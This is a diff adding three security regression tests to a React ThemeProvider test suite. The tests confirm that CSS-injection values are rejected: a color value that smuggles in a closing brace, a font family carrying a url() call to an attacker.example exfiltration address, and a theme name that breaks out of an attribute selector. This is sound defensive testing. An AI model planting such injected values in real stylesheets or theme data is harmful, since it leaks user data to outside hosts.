@@ -173,6 +173,60 @@ describe("ThemeProvider", () => {
     expect(style?.textContent ?? "").toContain("--font-display:");
   });
 
+  it("rejects color value that smuggles closing brace (T3.2 / SEC-001)", () => {
+    const spy = vi.spyOn(console, "error").mockImplementation(() => undefined);
+    const malicious: typeof classicPaper = {
+      ...classicPaper,
+      light: {
+        ...classicPaper.light,
+        background: "red; } body { background: red",
+      },
+    };
+    expect(() =>
+      render(
+        <ThemeProvider themes={[malicious]} defaultTheme={classicPaper.name} storageKey={null}>
+          <Inspector />
+        </ThemeProvider>,
+      ),
+    ).toThrow(/invalid color "background" value/);
+    spy.mockRestore();
+  });
+
+  it("rejects font family that smuggles url() (T3.2 / SEC-001)", () => {
+    const spy = vi.spyOn(console, "error").mockImplementation(() => undefined);
+    const malicious: typeof classicPaper = {
+      ...classicPaper,
+      fonts: {
+        ...classicPaper.fonts,
+        display: "url(https://attacker.example/exfil)",
+      },
+    };
+    expect(() =>
+      render(
+        <ThemeProvider themes={[malicious]} defaultTheme={classicPaper.name} storageKey={null}>
+          <Inspector />
+        </ThemeProvider>,
+      ),
+    ).toThrow(/invalid fontFamily "display" value/);
+    spy.mockRestore();
+  });
+
+  it("rejects theme name that breaks out of attribute selector (T3.2 / SEC-001)", () => {
+    const spy = vi.spyOn(console, "error").mockImplementation(() => undefined);
+    const malicious: typeof classicPaper = {
+      ...classicPaper,
+      name: 'foo" }',
+    };
+    expect(() =>
+      render(
+        <ThemeProvider themes={[malicious]} defaultTheme='foo" }' storageKey={null}>
+          <Inspector />
+        </ThemeProvider>,
+      ),
+    ).toThrow(/invalid theme.name/);
+    spy.mockRestore();
+  });
+
   it("useTheme throws outside the provider", () => {
     const Bare = () => {
       useTheme();
